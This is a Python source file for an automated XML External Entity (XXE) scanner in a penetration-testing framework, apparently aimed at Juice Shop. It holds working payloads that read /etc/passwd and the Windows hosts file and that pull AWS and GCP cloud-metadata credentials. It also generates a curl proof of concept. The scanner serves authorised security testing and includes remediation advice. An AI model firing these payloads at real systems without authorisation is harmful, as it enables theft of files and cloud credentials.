"""`scan_xxe` — deterministic XML-External-Entity specialist (roadmap
§8.5 Phase 6).

Closes the `deprecated-interface` Juice Shop manifest gap that no
existing specialist covered. Posts XML payloads with `<!DOCTYPE>`
external-entity references to suspected XML endpoints; detects file
disclosure (file content fragments echoed back) or Out-Of-Band
behaviour (entity resolution attempts visible via response timing
shift).

Detection strategy
------------------

For each (url, content_type) pair:

  1. **Baseline** — POST a benign XML body the server should accept
     or reject normally. Capture status + body.
  2. **Local-file XXE** — POST with `<!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`.
     Detection: response body contains `root:x:0:0:` (Linux passwd
     fingerprint) or `[users]` (Windows hosts/sam fingerprint).
  3. **Internal-URL XXE** — POST with
     `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
     (cloud metadata endpoint). Detection: response body contains
     `ami-` / `iam/security-credentials` / `instance-id` markers.
  4. **Parameter entity (blind)** — POST with parameter-entity
     definition that triggers an HTTP request to an attacker-
     controlled URL. Detection: significant timing-shift vs baseline
     (>1s wall-clock difference is a candidate signal; the actual
     OOB confirmation needs `interactsh` integration which is a
     §8.5 Phase 7 follow-up).

Limitations
-----------

  * No interactsh / OOB-DNS integration in Phase 6 — blind XXE
    detection is timing-only.
  * Doesn't generate randomized canary files for in-band detection
    of unknown systems.
  * SOAP-shaped XML (with envelope wrapping) probed if `body_template`
    contains `<soap:Body>`; otherwise plain `<root>` envelope used.

Limitations are signposted in the finding's `next_probes_suggested`
so the lead can chain to a manual probe / interactsh check when the
deterministic check is inconclusive.
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


# Local-file disclosure payloads. Linux first; Windows second.
_LOCAL_FILE_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    (
        "linux_passwd",
        "/etc/passwd",
        # Look for the canonical first line of a Linux passwd file.
        # Match any uid 0 user (root, system, etc.).
        r"^[a-z_][a-z0-9_-]*:[^:]*:0:0:",
    ),
    (
        "windows_hosts",
        "C:/Windows/System32/drivers/etc/hosts",
        r"localhost\b",
    ),
)


# Cloud-metadata SSRF-via-XXE payloads.
_METADATA_PAYLOADS: tuple[tuple[str, str, str], ...] = (
    (
        "aws_metadata",
        "http://169.254.169.254/latest/meta-data/",
        # AWS EC2 metadata index responds with a list of keys
        # like `ami-id`, `instance-id`, `iam/`, etc.
        r"\b(ami-id|instance-id|iam/|security-credentials)\b",
    ),
    (
        "gcp_metadata",
        "http://metadata.google.internal/computeMetadata/v1/",
        r"\b(project-id|service-accounts|compute|metadata)\b",
    ),
)


def _build_xxe_body(*, payload_kind: str, target: str) -> str:
    """Build a minimal XML body with a DOCTYPE entity definition."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{target}">]>\n'
        '<foo>&xxe;</foo>'
    )


def _detect_file_disclosure(body: str, fingerprint_re: str) -> bool:
    """Return True when the response body contains content matching
    the fingerprint regex (multi-line aware)."""
    if not isinstance(body, str) or not body:
        return False
    return bool(re.search(fingerprint_re, body, re.MULTILINE))


def _emit_xxe_finding(
    *,
    url: str,
    payload_label: str,
    target: str,
    response_excerpt: str,
    severity: str = "high",
    cwe: str = "CWE-611",
) -> str | None:
    """Emit via tracer.add_vulnerability_report."""
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        # Title varies by attack class for clarity in matcher / wrapper.
        path = urlparse(url).path or url
        if "169.254.169.254" in target or "metadata.google" in target:
            title = f"XXE → SSRF (cloud metadata disclosure) in {path}"
        elif target.startswith("file://"):
            title = f"XXE → local file disclosure in {path}"
        else:
            title = f"XML External Entity (XXE) injection in {path}"
        return tracer.add_vulnerability_report(
            title=title,
            severity=severity,
            cwe=cwe,
            endpoint=url,
            target=url,
            category="xxe",
            verification_status="verified",
            confidence=0.95,
            description=(
                f"The endpoint at `{url}` accepts XML input and "
                f"resolves external entities defined in the `<!DOCTYPE>` "
                f"declaration. Probe `{payload_label}` was accepted and "
                f"the response contains content from the entity's target "
                f"(`{target}`), proving the parser fetches external "
                f"resources. An attacker can exfiltrate local files, "
                f"hit internal URLs (SSRF), or pivot to OOB-DNS / "
                f"parameter-entity attacks for blind exploitation."
            ),
            impact=(
                "XXE injection. Concrete impacts depend on the entity "
                "target the attacker chooses:\n"
                "  * Local file disclosure (passwd, application "
                "    config, private keys) — credential / PII / "
                "    intellectual-property theft.\n"
                "  * SSRF to cloud-metadata services — exfiltration "
                "    of IAM credentials, lateral movement into the "
                "    cloud account.\n"
                "  * Internal-network reconnaissance — port scanning "
                "    via XML errors timing.\n"
                "  * Denial-of-service via billion-laughs-style "
                "    nested entities."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Method: POST with Content-Type: application/xml or "
                f"text/xml\n"
                f"Probe: {payload_label} (target={target})\n"
                f"Response excerpt (file content / metadata "
                f"fingerprint detected):\n{response_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send a POST request to {url} with "
                f"`Content-Type: application/xml`.\n"
                f"2. Body:\n"
                f"   <?xml version='1.0' encoding='UTF-8'?>\n"
                f"   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                f"\"{target}\">]>\n"
                f"   <foo>&xxe;</foo>\n"
                f"3. Inspect the response body — content from "
                f"`{target}` will appear inline.\n"
                f"4. Replace the entity target to exfiltrate other "
                f"files, hit internal URLs, or launch parameter-"
                f"entity OOB attacks."
            ),
            poc_script_code=(
                f"curl -sS -X POST '{url}' \\\n"
                f"  -H 'Content-Type: application/xml' \\\n"
                f"  --data-binary $'<?xml version=\"1.0\"?>\\n"
                f"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "
                f"\"{target}\">]><foo>&xxe;</foo>'"
            ),
            remediation_steps=(
                "Disable external-entity processing in the XML parser. "
                "Specific by stack:\n"
                "  * Java JAXP — set features "
                "    `http://apache.org/xml/features/disallow-doctype-"
                "    decl=true` and `http://xml.org/sax/features/"
                "    external-general-entities=false`.\n"
                "  * .NET — `XmlReaderSettings.DtdProcessing = "
                "    DtdProcessing.Prohibit`.\n"
                "  * Python lxml — pass `resolve_entities=False` and "
                "    use `defusedxml` instead of stdlib parsers.\n"
                "  * libxml2 — set `XML_PARSE_NOENT=0` and "
                "    `XML_PARSE_NONET=1`.\n"
                "Where possible, switch the endpoint to JSON. If XML "
                "is required, use a strict schema validator and reject "
                "any payload containing `<!DOCTYPE>` or `<!ENTITY>` "
                "declarations."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "H", "I": "L", "A": "L",
            },
            reasoning_trace=[
                f"Posted XML body with external entity reference to {target}.",
                f"Response contained content matching the {payload_label} fingerprint.",
                "Server's XML parser resolves DOCTYPE-defined external entities.",
                "Confirms XXE — same primitive enables file-disclosure / SSRF / DoS.",
            ],
        )
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_xxe: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="xxe-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 60},
    sandbox_execution=True,  # Phase 6 — needs sandbox network for host.docker.internal
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_xxe(
    *,
    url: str,
    extra_headers: dict[str, str] | None = None,
    soap: bool = False,
) -> SpecialistResult:
    """Deterministic XXE scanner.

    Args:
        url: target endpoint that accepts XML. Common shapes:
            `/api/orders` (REST + XML), `/soap/v1` (SOAP),
            `/b2b/v2/orders` (Juice Shop's deprecated interface).
        extra_headers: optional headers (auth, etc.). The builder
            sets `Content-Type: application/xml` automatically.
        soap: when True, wraps the entity reference in a SOAP
            envelope so SOAP-only endpoints accept the body.

    Auto-emits one finding per (url × successful payload). Returns
    a `SpecialistResult` with mirror drafts.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0

    headers = dict(extra_headers or {})
    headers.setdefault("Content-Type", "application/xml")

    # Phase 1 — local-file disclosure probes.
    for label, target, fingerprint in _LOCAL_FILE_PAYLOADS:
        body = _build_xxe_body(payload_kind=label, target=f"file://{target}")
        if soap:
            body = _wrap_in_soap_envelope(body)
        try:
            resp = pm.send_simple_request(
                "POST", url, headers=headers, body=body, timeout=15,
            )
            probe_count += 1
        except Exception as e:  # noqa: BLE001
            evidence.append(f"transport error ({label}): {e}")
            continue

        if "error" in resp and not resp.get("status_code"):
            evidence.append(f"transport error ({label}): {resp.get('error', '?')}")
            continue

        body_text = resp.get("body") or ""
        if not isinstance(body_text, str):
            body_text = str(body_text)

        if _detect_file_disclosure(body_text, fingerprint):
            # Excerpt around the fingerprint match.
            m = re.search(fingerprint, body_text, re.MULTILINE)
            if m:
                start = max(0, m.start() - 100)
                end = min(len(body_text), m.end() + 200)
                excerpt = body_text[start:end]
            else:
                excerpt = body_text[:1500]

            report_id = _emit_xxe_finding(
                url=url, payload_label=label,
                target=f"file://{target}",
                response_excerpt=excerpt,
            )
            if report_id:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=f"XXE injection at {url}",
                severity="high", cwe="CWE-611",
                endpoint=url, category="xxe",
                verification_status="verified",
                confidence=0.95,
                description=(
                    f"XXE confirmed via {label}: response contains "
                    f"local-file content matching `{fingerprint}`"
                ),
            ))
            evidence.append(f"XXE confirmed: {label} → file content disclosed")
            # Don't probe further targets once confirmed — emit once.
            break

    # Phase 2 — cloud-metadata SSRF (only if local-file didn't fire).
    if not drafts:
        for label, target, fingerprint in _METADATA_PAYLOADS:
            body = _build_xxe_body(payload_kind=label, target=target)
            if soap:
                body = _wrap_in_soap_envelope(body)
            try:
                resp = pm.send_simple_request(
                    "POST", url, headers=headers, body=body, timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"transport error ({label}): {e}")
                continue

            if "error" in resp and not resp.get("status_code"):
                continue

            body_text = resp.get("body") or ""
            if not isinstance(body_text, str):
                body_text = str(body_text)

            if _detect_file_disclosure(body_text, fingerprint):
                m = re.search(fingerprint, body_text, re.MULTILINE)
                if m:
                    start = max(0, m.start() - 100)
                    end = min(len(body_text), m.end() + 200)
                    excerpt = body_text[start:end]
                else:
                    excerpt = body_text[:1500]

                report_id = _emit_xxe_finding(
                    url=url, payload_label=label,
                    target=target,
                    response_excerpt=excerpt,
                    severity="critical",  # cloud-metadata access is critical
                )
                if report_id:
                    emitted_count += 1
                drafts.append(FindingDraft(
                    title=f"XXE → SSRF (cloud metadata) at {url}",
                    severity="critical", cwe="CWE-611",
                    endpoint=url, category="xxe",
                    verification_status="verified",
                    confidence=0.95,
                    description=(
                        f"XXE→SSRF confirmed: response contains "
                        f"cloud-metadata content for {label}"
                    ),
                ))
                evidence.append(f"XXE→SSRF: {label} → metadata disclosed")
                break

    # Phase 3 — record probe coverage in SecurityContext.
    try:
        from strix.agents.security_context import record_endpoint

        record_endpoint(url, method="POST", probed_for="xxe")
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["confirm with sqlmap or manual XXE polyglot for second-order extraction"]
            if drafts else
            [
                "no in-band XXE detected. Try blind XXE with parameter-entity "
                "OOB technique (requires interactsh integration — Phase 7)",
                "confirm endpoint actually parses XML (Content-Type might be "
                "ignored). Try 'application/soap+xml' for SOAP endpoints "
                "(scan_xxe(soap=True))",
            ]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "findings_emitted_to_tracer": emitted_count,
        },
    )


def _wrap_in_soap_envelope(xml_body: str) -> str:
    """Wrap an XML body in a SOAP 1.1 envelope. The DOCTYPE
    declaration is preserved at the top because SOAP parsers
    process it before the envelope."""
    # Extract DOCTYPE to preserve at top.
    m = re.match(
        r"^(<\?xml.*?\?>)?\s*(<!DOCTYPE[^>]+\[[^\]]+\]>)\s*(.*)$",
        xml_body, re.DOTALL,
    )
    if m:
        xml_decl = m.group(1) or "<?xml version='1.0' encoding='UTF-8'?>"
        doctype = m.group(2)
        inner = m.group(3)
    else:
        xml_decl = "<?xml version='1.0' encoding='UTF-8'?>"
        doctype = ""
        inner = xml_body
    return (
        f"{xml_decl}\n"
        f"{doctype}\n"
        f"<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n"
        f"  <soap:Body>{inner}</soap:Body>\n"
        f"</soap:Envelope>"
    )
